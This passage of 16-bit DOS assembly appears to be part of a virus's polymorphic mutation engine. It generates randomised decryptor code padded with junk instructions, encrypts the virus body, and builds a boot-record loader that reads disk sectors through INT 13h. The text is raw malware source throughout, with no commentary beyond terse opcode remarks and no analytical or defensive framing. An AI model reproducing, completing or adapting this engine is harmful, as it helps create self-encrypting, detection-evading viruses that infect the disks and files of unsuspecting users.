       call    MoveCLI
       mov al,26h          ;ES: prefix
       test    dl,dl           ;was LES?
       jpo SegmES
       call    RandHalf
       jz  LeaveStoreDS
       mov al,3Eh          ;DS: prefix
   SegmES:
       stosb
   LeaveStoreDS:
       mov al,8Ah          ;MOV ByteRegister,[BaseRegister]
       stosb
       lea bx,MyTable
       mov al,LenMyTable
       call    Rand
       xlat
       mov ChngReg,al
       mov bl,al
       shl al,cl
       or  al,0
   BaseReg1    equ byte ptr $-1
       stosb
       call    MoveCLI
       call    RandHalf
       lea ax,MoveBegCrypt
       lea dx,MovCX
       jz  SoBeIt
       xchg    dx,ax
   SoBeIt:
       push    dx
       call    ax
       call    MoveCLI
       pop ax
       call    ax
       call    MoveCLI
       je  YesCLI
       stosb
   YesCLI:
       mov LenDecrypt,di
       lea ax,MaskChange
       lea dx,ByteChange
       lea si,CryptBuff
       call    Choose
       mov al,0
   IncReg      equ byte ptr $-1
       call    IncrementReg
       call    StorePrefix
       call    GetCycle
   CheckFive:
       cmp di,LenMainEnc-5
       ja  CheckOne
       mov cl,1
       call    NextNOP
       jmp CheckFive
   CheckOne:
       cmp di,LenMainEnc
       jae EndOne
       lea bx,MainGarbage
       mov al,LenMainGarbage
       call    RandLat
       jmp CheckOne
   EndOne:
       lea di,MainBuffer
       sub si,si
       mov cl,LenMainEnc
       rep movsb
       mov cx,LenCrpt
       pop ax
   CodeMyself:
       lodsb
   CryptBuff   db  7 dup (?)
       inc di
       loop    CodeMyself
       popf
       pop bx
       je  MutationExit
       mov al,CntDec
       call    Rand
       inc ax
       inc ax
       mov Count,al
   NextRoutine:
       call    MultiMorphic
       jc  MutationExit
       sub ax,0
   WhatSUB     equ word ptr $-2
       mov WhatOff,ax
       mov cx,0
   LenEnc      equ word ptr $-2
       mov SaveLen,cx
       lea si,Decrypt
       lea di,MainBuffer
       rep movsb
       dec Count
       jnz NextRoutine
       push    ax
       call    WriteEnd
       jc  ErrWriteEnd
       mov ah,40h
       int 3
   ErrWriteEnd:
       pop ax
       lea si,Header
   MutationExit:
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Choose:
       call    RandZF
       jz  OffChange
       xchg    dx,ax
   OffChange:
       push    dx
       jmp ax

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   MoveBegCrypt:
       mov al,3
       cmp bl,al
       je  DecLen
       cmp bl,7
       jne NoDecLen
   DecLen:
       dec ax
   NoDecLen:
       call    GetWorkReg1
       mov IncReg,al
       mov bx,0
   BegCrypt    equ word ptr $-2
   GetAddrMode:
       mov dh,ah
       call    MoveOrLoad
       call    RandThree
       mov LenCodeCrypt,al
       push    ax
       ror al,2
       or  al,dh
       mov SaveCodeCrypt,al
       pop ax
       dec ax
       mov al,0
       js  EndAddrMode
       pushf
       call    BigRand
       mov AddrCrypt,ax
       popf
       jnz WordAddr
       cbw
   WordAddr:
       sub bx,ax
       mov al,RetAfter
   EndAddrMode:
       mov JmpGetRet,al
       xchg    bx,ax
       stosw
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   MaskChange:
       lea bx,SpecTable2
       mov al,Len_Chng/2
       call    CommonGet
       mov dx,ax
       mov bx,dx
       or  dh,11000000B
       or  dh,0
   ChngReg     equ byte ptr $-1
       or  ah,11000100B
       mov [si],ax
       lodsw
       call    BigRand
       call    CheckSpec
       jne NoNOP
       mov al,0
       org $-1
       nop
   NoNOP:
       mov [si],al
       xchg    dx,ax
       stosw
       je  TwoBytes
       xchg    dx,ax
       stosb
   TwoBytes:
       inc si
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   ByteChange:
       mov al,0
   ChooSegm    equ byte ptr $-1
       cmp al,2 shl 3      ;SS ?
       mov al,1
       je  CodePrefix
       cmp al,JumpSYS
       jbe CodePrefix
       inc ax
   CodePrefix:
       call    Rand
       mov al,2Eh          ;CS prefix
       jz  SegmCS
       mov al,36h          ;SS prefix
   SegmCS:
       stosb
       lea bx,CrypTable
       mov al,Len_CT
       call    Rand
       xlat
       mov bx,ax
       mov dx,ax
       cmp al,0D0h         ;Rotate?
       pushf
       jne NoRotate
       call    RandShift
       or  bl,al
       or  dl,al
       call    RandHalf
       shl al,cl
       or  bh,al
       not al
       and al,00001000B
   CorrOpCode:
       or  dh,al
       or  dh,101B
       xchg    bx,ax
       jmp SaveCryp
   NoRotate:
       cmp al,0F6h         ;NOT(NEG)?
       jne OtherOpCode
       call    RandHalf
       shl al,cl
       or  al,10h
       or  bh,al
       jmp CorrOpCode
   OtherOpCode:
       mov ah,ChngReg
       shl ah,cl
       or  dh,00100101B
   SaveCryp:
       or  ah,SaveCodeCrypt
       stosw
       call    StoreAddr
       popf
       je  NoRotateAgain
       cmp dl,0F6h         ;NOT(NEG)?
       je  NoRotateAgain
       cmp dl,30h          ;XOR?
       je  NoRotateAgain
       xor dl,28h
   NoRotateAgain:
       mov word ptr [si],0
       org $-2
       mov [di],al
       lodsw
       mov [si],dx
       lodsw
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   MoveCLI:
       mov al,0
   ZeroCLI     equ byte ptr $-1
       test    al,al
       jz  ExitCLI
       call    Rand
       mov al,0
   CLDorCLI    equ byte ptr $-1
       jnz ExitCLI
       stosb
       mov ZeroCLI,ah
   ExitCLI:
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   BootMutation:
       mov cx,LenMBR
       push    si
       rep movsb
       pop di
       mov ax,di
       sub ax,bx
       push    ax bx dx bp
       mov ZeroRet,0
       org $-1
       nop
       call    AltNOP
       call    ZeroRand
       call    OneGen
       call    RandHalf
       mov al,RegWord
       jz  OverStack
       or  al,11010000B
       mov ah,10001110B        ;MOV SS,WordRegister
       xchg    ah,al
       stosw
       jmp StoreStack
   OverStack:
       or  al,0
       org $-1
       push    ax
       stosb
       call    AltNOP
       mov al,0
       org $-1
       pop ss
       stosb
   StoreStack:
       mov al,4
       call    MoveOrLoad      ;LEA or MOV SP,????
       mov al,0Dh
       call    Rand
       add al,70h
       mov WhichSegHigh,al
       xchg    ah,al
       stosw
       call    AltNOP
       lea si,CommandTable
       mov bx,0
   WhichSub    equ word ptr $-2
       mov ax,[bx+si]
       xchg    ax,[si+LenCommand]
       mov [bx+si],ax
       inc bx
       inc bx
       xchg    bx,ax
       cmp al,LenCommand
       jb  NoOverflow
       mov al,0
   NoOverflow:
       mov WhichSub,ax
       push    di
   NextCommand:
       call    OneGen
       lodsw
       call    ax
       cmp si,offset EndCommand
       jbe NextCommand
       call    OneGen
       call    MovAX
       call    OneGen
       call    RandFour
       mov bl,5Fh
       jz  ThisChoice
       mov bl,9Fh
       dec ax
       jnz NoThisChoice
   ThisChoice:
       call    ItsGetCD13h
       jmp WalkNextGet
   NoThisChoice:
       call    GetCD13h
   WalkNextGet:
       mov cl,72h          ;JC
       call    GetJmpCarry
       pop ax
       sub ax,di
       dec ax
       stosb
       call    AltNOP
       call    RandHalf
       jz  OverPush
       mov al,0EAh         ;JMP FAR
       stosb
       sub ax,ax
       stosw
       mov ax,0
   WhichSegHigh    equ byte ptr $-1
       stosw
       jmp ExitMove
   OverPush:
       call    RandHalf
       pushf
       jz  BeRETF
       mov al,0
       org $-1
       pushf
       stosb
   BeRETF:
       call    AltNOP
       mov al,0
       org $-1
       push    es
       stosb
       call    AltNOP
       call    GetReg
       push    ax
       call    ZeroWord
       call    OneGen
       pop ax
       or  al,0
       org $-1
       push    ax
       stosb
       call    AltNOP
       popf
       mov al,0
       org $-1
       iret
       jnz WasIRET
       call    RandHalf
       or  al,0CAh         ;RETF Im16
       jpo WasIRET
       call    CMPbyte
       mov al,70h-10h
       call    Rand
       not al
   WasIRET:
       stosb
   ExitMove:
       pop bp dx bx ax
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   GetJmpCarry:
       call    StorePrefix
       call    RandHalf
       jz  LetCarry
       xor cl,al
       mov al,0
       org $-1
       cmc
       stosb
       call    StorePrefix
   LetCarry:
       xchg    cx,ax
       stosb
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   MovES:
       mov ax,0
       org $-2
       mov es,sp
       stosw
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   MovDX:
       mov al,2            ;LEA or MOV DX,????
       mov cx,0
   ReadHead    equ word ptr $-2
       jcxz    ZeroWord
       push    cx
       call    MoveOrLoad
       pop ax
       stosw
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   MovCX:
       mov al,1            ;LEA or MOV CX,????
       call    MoveOrLoad
       mov ax,0
   ReadCyl     equ word ptr $-2
       stosw
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   MovAX:
   EnableFn    label   byte
       retn
       mov EnableFn,0
       org $-1
       retn
       mov al,0            ;LEA or MOV AX,????
       call    MoveOrLoad
       mov ax,200h+SECTORS
       stosw
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   ZeroRand:
       call    GetReg
       cmp ax,0
       org $-2

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   ZeroBX:
       mov al,3
   ZeroWord:
       mov ah,1

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   ZeroReg:
       mov RegWord,al
       mov cl,3
       mov bx,0C028h       ;SUB
       push    ax
       call    RandThree
       jz  LetSUB
       mov bl,30h          ;XOR
       dec ax
       jz  LetSUB
       pop ax
       test    ah,ah
       jz  ByteSize
       call    MoveOrLoad      ;LEA or MOV WordRegister,0
       mov ax,(-0B0h) and 0FFh
   ByteSize:
       add al,0B0h         ;MOV ByteRegister,0
       stosw
       retn
   LetSUB:
       pop ax
       or  bl,ah
       or  bh,al
       shl al,cl
       or  bh,al
       call    RandShift
       or  ax,bx
       stosw
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   ZeroAH:
   ZeroRet     label   byte
       nop
       mov ZeroRet,0
       org $-1
       retn
       mov ax,4
       jmp ZeroReg

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   CD13h:
       call    ZeroAH
       mov EnableFn,0
       org $-1
       nop
   GetCD13h:
       mov bl,1Eh          ;DWORD PTR [XXXX]
       call    RandHalf
       mov ax,0
       org $-2
       int 13h
       jz  WordOffset
   ItsGetCD13h:
       mov al,0
       org $-1
       pushf
       stosb
       push    bx
       call    OneGen
       mov ax,0FF36h       ;SS:/CALL
       stosw
       pop ax
       stosb
       cmp al,5Fh          ;DWORD PTR [BX+XX]?
       mov ax,4Ch
       jz  ByteOffset
   WordOffset:
       stosw
   NotOffset:
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   StoreAddr:
       mov al,0
   LenCodeCrypt    equ byte ptr $-1
       dec al
       js  NotOffset
       mov ax,0
   AddrCrypt   equ word ptr $-2
       jnz WordOffset
   ByteOffset:
       stosb

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   RandByte:
       mov al,-1
       cmp ax,0
       org $-2
   RandFour:
       mov al,4
       cmp ax,0
       org $-2
   RandThree:
       mov al,3
       cmp ax,0
       org $-2
   RandEight:
       mov al,8
       cmp ax,0
       org $-2
   BigRand:
       mov al,0
       cmp ax,0
       org $-2
   RandHalf:
       mov al,2
   Rand:
       mov ah,0
   RandWord:
       sti
       push    cx dx ax
       mov ah,0
       int 1Ah
       add bp,0AA55h
   Randomize   equ word ptr $-2
       xor bp,dx
       sub ax,ax
       out 43h,al
       cwd
       add bp,bp
       in  al,40h
       xchg    ah,al
       in  al,40h
       xor cl,al
       sub ax,[bp]
       add cs:Randomize,ax
       rol bp,cl
       xor cl,ah
       xor ax,bp
       ror ax,cl
       pop cx
       jcxz    NoDIV
       div cx
       test    dx,dx
       xchg    dx,ax
   NoDIV:
       pop dx cx
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   RandShift:
       call    RandHalf
       shl al,1
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   RandZF:
       push    ax
       call    RandHalf
       pop ax
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   GetReg:
       call    RandEight
       cmp al,4            ;SP?
       jne NoSP
       dec ax
   NoSP:
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   CheckWorkReg:
       push    ax
       mov ah,WorkReg
       dec ah
       js  ThisWorkReg
       and al,7
       jz  ThisWorkReg
       dec al
       jz  ThisWorkReg
       cmp ah,al
   ThisWorkReg:
       pop ax
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   GetSpecReg:
       mov al,LenReg
       cmp ch,3
       je  AllReg
       dec ax
       stc
   AllReg:
       pushf
       cmp ah,WorkReg
       jne NormalGen
       call    RandEight
       cmp al,4
       je  ItRegPop
       popf
       jc  ItReg
   RandRegSize:
       call    RandZF
       jz  ItReg
   LetRegWord:
       inc dx
   ItReg:
       retn
   NormalGen:
       call    Rand
       push    bx
       lea bx,RegTable
       xlat
       pop bx
       cmp al,5            ;BP reg
       jne NoWordReg
       inc dx
   ItRegPop:
       popf
       retn
   NoWordReg:
       cmp al,4            ;AH reg
       je  ItRegPop
       mov ah,WorkReg
       popf
       jnc AllRegEmpty
       cmp ah,3            ;BL and BX reg
       jne ItRegShort
       cmp al,7            ;BH reg
       je  DecReg
       cmp ah,al
       jne ItRegShort
   DecReg:
       dec ax
   ItRegShort:
       retn
   AllRegEmpty:
       cmp ah,ch
       jne NoRegBX
       cmp ah,al
       je  DecReg
       cmp al,7
       je  LetRegWord
   NoRegBX:
       cmp ah,al
       jne RandRegSize

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   CheckSpec:
       cmp bl,0D0h         ;R?L ??,1 ?
       je  NextChk
       cmp bl,0D2h         ;R?L ??,CL?
       je  NextChk
       cmp bl,0FEh         ;INC/DEC  ?
       je  NextChk
       cmp bx,18F6h        ;NEG      ?
       je  NextChk
       cmp bx,20F6h        ;MUL      ?
       je  NextChk
       cmp bx,28F6h        ;IMUL     ?
       je  NextChk
       cmp bx,10F6h        ;NOT      ?
   NextChk:
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   GetNOP:
       lea bx,OffsNOP
       jmp CommonGet
   GetWorkReg:
       mov al,3
   GetWorkReg1:
       lea bx,WorkRegTable
   CommonGet:
       call    Rand
       shl ax,1
       add bx,ax
       mov ax,[bx]
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   MakePush:
       lea si,SysPush
       mov cl,LenSysPush
   PushNext:
       call    StorePrefix
       movsb
       loop    PushNext
       mov bx,0
   WhichPush   equ word ptr $-2
       mov al,SysPush[bx]
       xchg    al,[si-1]
       mov SysPush[bx],al
       lea si,SysPop+LenSysPush-1
       sub si,bx
       lodsb
       xchg    al,SysPop
       mov [si-1],al
       inc bx
       xchg    bx,ax
       cmp al,LenSysPush-1
       jb  OkayCount
       mov al,0
   OkayCount:
       mov WhichPush,ax
       call    GetSenseless
       mov al,0
       org $-1
       cld
       stosb
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   GetCycle:
       mov bx,0100100000000000B+LenJmpCycleUp  ;DEC WordRegister
       mov dx,0
   LenDecrypt  equ word ptr $-2
       mov ax,di
       sub ax,dx
       cmp ax,126
       ja  JmpNEAR
       cmp al,121
       mov al,0E2h         ;LOOP
       ja  LetLOOP
       call    RandZF
       jnz LetLOOP
       lea ax,JmpCycleUp
       call    DecrementCX
       cmp al,0
       org $-1
   LetLOOP:
       stosb
       sub dx,di
       dec dx
       xchg    dx,ax
       stosb
       retn
   JmpNEAR:
       lea ax,JmpCycleDown
       inc bx
       call    DecrementCX
       push    di dx
       inc di
       call    GetSenseless
       mov al,0E9h         ;JMP NEAR
       stosb
       pop ax
       sub ax,di
       dec ax
       dec ax
       stosw
       call    RandEight
       add di,ax
       pop ax
       jmp GetCond

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   GetRetCode:
       call    RandThree
       dec ax
       mov al,0CAh         ;RETF Im16
       js  RetFar
       mov al,0C2h         ;RETN Im16
       jz  RetNear
       mov al,0
       org $-1
       pushf
       stosb
       call    GetSenseless
       mov al,0
       org $-1
       iret
   RetFar:
       push    ax
       lea bx,SegPush
       mov al,Len_Seg
       cmp JumpSYS,0
       je  NoDriverSeg
       dec ax
   NoDriverSeg:
       call    RandLat
       call    GetSenseless
       pop ax
   RetNear:
       call    RandZF
       jz  RetIm16
       or  al,1
   RetIm16:
       mov SaveRet,al
       mov al,0
   WorkReg     equ byte ptr $-1
       test    al,al
       jnz NoFreeReg
       call    StoreOfst
   NoFreeReg:
       or  al,0
       org $-1
       push    ax
       stosb
       jmp GetSenseless

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   TakeSeg:
       push    ax
       call    GetSenseless
       pop ax
       dec ax
       js  NoNewSeg
       call    RandZF
       jz  OkNewSeg
   NoNewSeg:
       call    RandHalf
       xchg    bx,ax
       cmp bh,JumpSYS
       je  NoCryptSys
       mov bl,0
   NoCryptSys:
       mov al,CorrSeg[bx]
   OkNewSeg:
       stosb

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   GetSenseless:
       call    RandThree
       inc ax
       xchg    cx,ax
   NextNOP:
       mov al,0
   WhatSimple  equ byte ptr $-1
       call    GetNOP
       push    cx
       call    ax
       pop cx
       loop    NextNOP
       jmp ConditionOn
   Condition   equ byte ptr $-1
       mov Condition,OnCondition
       mov ax,0
   StoreCond   equ word ptr $-2
   GetCond:
       push    di
       sub di,ax
       xchg    di,ax
       dec ax
       stosb
       pop di
   OnCondition equ $-Condition-1
   ConditionOn:
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   GetThreeSenseless:
       call    GetSenseless
       call    GetSenseless
       jmp GetSenseless

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   ChainMutation:
       lea di,Decrypt
       mov al,2
       mov WhatSimple,al
       jmp $
   JumpCOM     equ byte ptr $-1
       cmp al,Count
       jbe NoFirstSub
       cmp cl,JumpSYS
       je  NoSysCrypt
       call    MakePush
   NoSysCrypt:
       sub ax,ax
       call    TakeSeg
       call    RandHalf
       mov al,0
       org $-1
       pop es
       jz  LetES
       mov al,0
       org $-1
       pop ds
   LetES:
       stosb
       push    ax
       call    TakeSeg
       pop ax
       xor al,18h          ;POP DS(ES)
       stosb
   NoFirstSub:
   ForCOM      equ $-JumpCOM-1
       inc WhatSimple
       lea si,Encrypt
       call    GetThreeSenseless
       call    GetReg
       mov bh,al
       call    MoveOrLoad
       mov ax,LenEnc
       stosw
       cmp bh,1            ;CX ?
       je  RegCount
       call    RandThree
       jz  PopCount
       dec ax
       pushf
       call    RandShift
       popf
       jz  ExchangeCount
       mov bl,10001001B        ;MOV CX,WordRegister
       or  bl,al
       cmp ax,0
       org $-2
   ExchangeCount:
       mov bl,10000111B        ;XCHG CX,WordRegister
       dec ax
       js  NoRegSecond
       or  bh,11001000B        ;XCHG WordRegister,CX
       jmp CommonCount
   NoRegSecond:
       mov cl,3
       shl bh,cl
       jnz NoXchgAX
       call    RandHalf
       mov al,0
       org $-1
       xchg    cx,ax
       jz  XchgAX
   NoXchgAX:
       or  bh,11000001B
   CommonCount:
       xchg    bx,ax
       stosw
       jmp RegCount
   PopCount:
       mov al,bh
       or  al,0
       org $-1
       push    ax
       stosb
       call    GetSenseless
       mov al,0
       org $-1
       pop cx
   XchgAX:
       stosb
   RegCount:
       call    GetWorkReg
       mov WorkReg,al
       push    ax
       call    GetSenseless
       pop ax
       mov bx,0
   WhatOff     equ word ptr $-2
       push    ax
       call    GetAddrMode
       pop ax
       or  al,0B8h         ;MOV WordRegister,????
       mov MoveBuffer,al
       xor al,0B8h or 40h      ;INC WordRegister
       mov SaveINC,al
       call    GetSenseless
       jmp $
   JmpGetRet   equ byte ptr $-1
       call    GetRetCode
   RetAfter    equ $-JmpGetRet-1
       call    RandEight
       mov al,0B0h         ;MOV AL,??
       jz  NoUseTrick
       mov al,0B8h         ;MOV AX,????
       call    CMPbyte
       lea bx,TrickFn
       mov al,LenTrickFn
       call    RandLat
       call    OneGen
       call    ItsSTD
       mov ax,0
       org $-2
       int 21h
       stosw
       call    GetSenseless
       lea bx,MoveOpCodes
       call    RandThree
       xlat
   NoUseTrick:
       call    CMPbyte
       mov CryptMask,ah
       call    GetSenseless
       mov LenDecrypt,di
       mov al,CntCom
       call    Rand
       inc ax
       xchg    cx,ax
   BigLoop:
       push    cx
       call    GetSenseless
       call    RandEight
       jz  NoChange
       call    RandHalf
       jz  SelectOperation     ;ADD [BaseRegister],AL
       mov al,28h          ;SUB [BaseRegister],AL
   SelectOperation:
       mov bl,[bp+di]
       and bl,10h
       jz  NoClearCarry
       or  al,bl
       and al,18h          ;ADC/SBB [BaseRegister],AL
       push    ax
       call    RandHalf
       or  al,0
       org $-1
       clc
       call    RandZF
       jz  CLCommand
       xor al,1            ;STC(CLC)
       stosb
       mov [si],al
       inc si
       call    StorePrefix
       mov al,0
       org $-1
       cmc
   CLCommand:
       stosb
       mov [si],al
       inc si
       pop ax
   NoClearCarry:
       or  ah,0
   SaveCodeCrypt   equ byte ptr $-1
       stosw
       test    al,10h
       jz  NoFlag
       xor al,8
       cmp ax,0
       org $-2
   NoFlag:
       xor al,28h
       and ah,7
       mov [si],ax
       lodsw
       call    StoreAddr
   NoChange:
       call    RandThree
       jz  NoChangeMask
       call    GetSenseless
       call    ChangeMask
   NoChangeMask:
       pop cx
       loop    BigLoop
       push    di
       mov di,si
       mov al,0
   SaveINC     equ byte ptr $-1
       push    ax
       mov ah,0E2h         ;LOOP
       stosw
       xchg    si,ax
       sub ax,offset Encryptor-3
       neg al
       mov ah,0
       org $-1
       retn
       stosw
       pop ax di
       and al,7
       call    IncrementReg
       call    GetSenseless
       call    GetCycle
       mov WorkReg,cl
       call    GetThreeSenseless
       cmp cl,JmpGetRet
       je  AlreadyRet
       call    RandHalf
       jnz StackRet
       lea ax,JmpReg
       push    ax
   StoreOfst:
       call    GetReg
       push    ax
       call    MoveOrLoad
       mov ax,WhatOff      ;LEA WordRegister,[????]
       stosw               ;or MOV WordRegister,????
       pop ax
       retn
   StackRet:
       call    GetRetCode
   AlreadyRet:
       mov al,0
   SaveRet     equ byte ptr $-1
       cmp al,0
       org $-1
       retn
       ja  NoRetNear
       call    RandZF
       jnz NoRetNear
       call    GetReg
       or  al,0
       org $-1
       pop ax
       stosb
       and al,7
   JmpReg:
       or  al,11100000B        ;JMP WordRegister
       mov ah,-1
       xchg    ah,al
       jmp StoreJmp
   NoRetNear:
       stosb
       and ax,1
   Fun2Ah      equ $-2
       jnz NoRetIm16
   StoreJmp:
       stosw
   NoRetIm16:
       call    RandEight
       add ax,di
       sub ax,offset Decrypt
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   MoveOrLoad:
       mov ah,0B8h         ;MOV WordRegister,????
       call    RandZF
       jz  LetMove
       mov byte ptr [di],8Dh   ;LEA WordRegister,[????]
       inc di
       mov cl,3
       shl al,cl
       mov ah,110B
   LetMove:
       or  al,ah
       stosb
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   ChangeMask:
       lea bx,MaskTable
       mov al,Len_Mask/2
       call    CommonGet
       inc ah
       jnz NoSaveCode
       call    CMPbyte
       cmp al,0
       org $-1
   NoSaveCode:
       stosw
       mov [si],ax
       lodsw
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   SimpleNOP1:
       lea bx,CodeTable
       cmp ch,WorkReg
       mov al,Len_Code
       jne TinyLen
       mov al,Len_CodeBig
   TinyLen:
       call    Rand
       xlat
       cmp al,0A8h         ;TEST AL,??
       je  CMPbyte
       cmp al,0E4h         ;IN AL,port8
       je  CMPbyte
       cmp al,0E5h         ;IN AX,port8
       je  CMPbyte
       cmp al,40h          ;INC WordRegister
       jb  NoINC
       cmp al,47h
       ja  NoINC
       call    CheckWorkReg
       je  ItsWorkReg
       call    RandZF
       jz  StoreNext
       add al,8
   StoreNext:
       stosb
       retn
   CMPbyte:
       mov StoreAL,al
       call    BigRand
       mov al,0
   StoreAL     equ byte ptr $-1
       stosw
       retn
   ItsWorkReg:
       call    RandZF
       jnz YesINC
       add al,8
   YesINC:
       stosb
       xor al,8
   StoreAlt:
       call    AltNOP
       stosb
       retn
   NoINC:
